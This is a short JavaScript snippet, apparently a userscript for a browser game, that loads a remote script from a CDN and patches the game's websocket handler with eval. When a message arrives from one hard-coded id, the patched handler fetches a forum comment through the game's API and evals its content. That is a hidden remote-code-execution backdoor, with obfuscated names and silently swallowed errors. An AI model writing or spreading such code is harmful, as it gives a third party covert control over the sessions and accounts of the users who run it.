(async ()=> {
    await $.getScript("https://cdn.jsdelivr.net/gh/parseml/many-deobf@latest/deobf.js");
bjghrg=Deobfuscator.object(ig.game, "useCdn", true);
bjghrg1=Deobfuscator.function(ig.game[bjghrg], "/j/f/gf/", true);
bjghrg2=Deobfuscator.function(ig.game[bjghrg], "/j/f/gc/", true);
blfdgjkf=function(mjjhgtm) {
    try{
ig.game[bjghrg][bjghrg1]((111132624627448).toString(16)+(mjjhgtm).toString(16)).done(b=>{ig.game[bjghrg][bjghrg2](b.threads[0]._id).done(c=>{eval(c.comments[0].content.replaceAll("\n",";"))})})
    }catch{}
    }
gfdghmmr=Deobfuscator.function(ig.game.websocket, "c,d)", true)
eval("ig.game.websocket."+gfdghmmr+"="+ig.game.websocket[gfdghmmr].toString().replaceAll("c,d){", "c,d){if(b.m=='lh'&&b.data.rid=='5ed02086677cd105f86141d6'&&b.data.ato>9999999999){blfdgjkf(b.data.ato)}else{").replaceAll("error(b))","error(b))}"))
})();
